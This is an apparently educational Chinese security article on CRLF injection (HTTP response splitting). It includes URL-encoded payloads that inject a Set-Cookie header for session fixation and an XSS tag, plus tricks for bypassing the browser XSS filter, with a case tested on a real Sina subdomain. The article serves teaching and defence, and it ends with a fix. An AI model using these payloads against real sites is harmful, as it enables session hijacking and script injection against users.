# CRLF Injection漏洞的利用与实例分析

0x00 背景
-------

* * *

CRLF Injection很少遇见，这次被我逮住了。我看zone中（[http://zone.wooyun.org/content/13323](http://zone.wooyun.org/content/13323)）还有一些同学对于这个漏洞不甚了解，甚至分不清它与CSRF，我详细说一下吧。

CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。

HRS是比XSS危害更大的安全问题，具体是为什么，我们往下看。

对于HRS最简单的利用方式是注入两个\r\n，之后在写入XSS代码，来构造一个xss。

0x01 实例
-------

* * *

举个例子，一般网站会在HTTP头中用Location: http://baidu.com这种方式来进行302跳转，所以我们能控制的内容就是Location:后面的XXX某个网址。

所以一个正常的302跳转包是这样：

```
HTTP/1.1 302 Moved Temporarily 
Date: Fri, 27 Jun 2014 17:52:17 GMT 
Content-Type: text/html 
Content-Length: 154 
Connection: close 
Location: http://www.sina.com.cn

```

但如果我们输入的是

```
http://www.sina.com.cn%0aSet-cookie:JSPSESSID%3Dwooyun

```

注入了一个换行，此时的返回包就会变成这样： 

```
HTTP/1.1 302 Moved Temporarily 
Date: Fri, 27 Jun 2014 17:52:17 GMT 
Content-Type: text/html 
Content-Length: 154 
Connection: close 
Location: http://www.sina.com.cn 
Set-cookie: JSPSESSID=wooyun

```

这个时候这样我们就给访问者设置了一个SESSION，造成一个“会话固定漏洞”。

当然，HRS并不仅限于会话固定，通过注入两个CRLF就能造成一个无视浏览器Filter的反射型XSS。

比如一个网站接受url参数http://test.sina.com.cn/?url=xxx，xxx放在Location后面作为一个跳转。如果我们输入的是

```
http://test.sina.com.cn/?url=%0d%0a%0d%0a<img src=1 onerror=alert(/xss/)>

```

我们的返回包就会变成这样：

```
HTTP/1.1 302 Moved Temporarily 
Date: Fri, 27 Jun 2014 17:52:17 GMT 
Content-Type: text/html 
Content-Length: 154 
Connection: close 
Location:
<img src=1 onerror=alert(/xss/)>

```

之前说了浏览器会根据第一个CRLF把HTTP包分成头和体，然后将体显示出来。于是我们这里这个标签就会显示出来，造成一个XSS。

为什么说是无视浏览器filter的，这里涉及到另一个问题。

浏览器的Filter是浏览器应对一些反射型XSS做的保护策略，当url中含有XSS相关特征的时候就会过滤掉不显示在页面中，所以不能触发XSS。

怎样才能关掉filter？一般来说用户这边是不行的，只有数据包中http头含有X-XSS-Protection并且值为0的时候，浏览器才不会开启filter。

说到这里应该就很清楚了，HRS不正是注入HTTP头的一个漏洞吗，我们可以将X-XSS-Protection:0注入到数据包中，再用两个CRLF来注入XSS代码，这样就成功地绕过了浏览器filter，并且执行我们的反射型XSS。

所以说HRS的危害大于XSS，因为它能绕过一般XSS所绕不过的filter，并能产生会话固定漏洞。

* * *

我们来一个真实案例吧。 新浪某分站含有一个url跳转漏洞，危害并不大，于是我就想到了CRLF Injection，当我测试

```
http://xxx.sina.com.cn/?url=%0a%0d%0a%0d%3Cimg%20src=1%3E

```

的时候，发现图片已经输出在页面中了，说明CRLF注入成功了：

![2014062816583715642.jpg](http://drops.javaweb.org/uploads/images/7456fff1f868bff8498ad08cee25178977b238c0.jpg)

那么我们试试XSS看看：

![2014062816585822978.jpg](http://drops.javaweb.org/uploads/images/3ffcb0c5cf11c9bbefdc2f6f58000a40f57cacf9.jpg)

看控制台，果然被XSS Filter拦截了。

那么我们就注入一个

```
X-XSS-Protection:0

```

到数据包中，看看什么效果：

![2014062816593849016.jpg](http://drops.javaweb.org/uploads/images/16fd9065fab777b966767556819c6e73d92226fd.jpg)

@mramydnei 还想到了一个利用字符编码来绕过XSS Filter的方法，当编码是is-2022-kr时浏览器会忽略%0f，这样我们在onerror后面加个%0f就能绕过filter，前提是注入一个

```
<meta charset=ISO-2022-KR> 

```

![2014062817010832293.jpg](http://drops.javaweb.org/uploads/images/809f97bf0d57220a3f026f6285aa5207813f1b03.jpg)

当然，在Location:这里注入只有webkit内核浏览器才能够利用，其他浏览器可能会跳转、出错。不过对于chrome的使用量来说，危害已经足够了。

0x02 修复
-------

* * *

如何修复HRS漏洞，当然是过滤\r 、\n之类的换行符，避免输入的数据污染到其他HTTP头。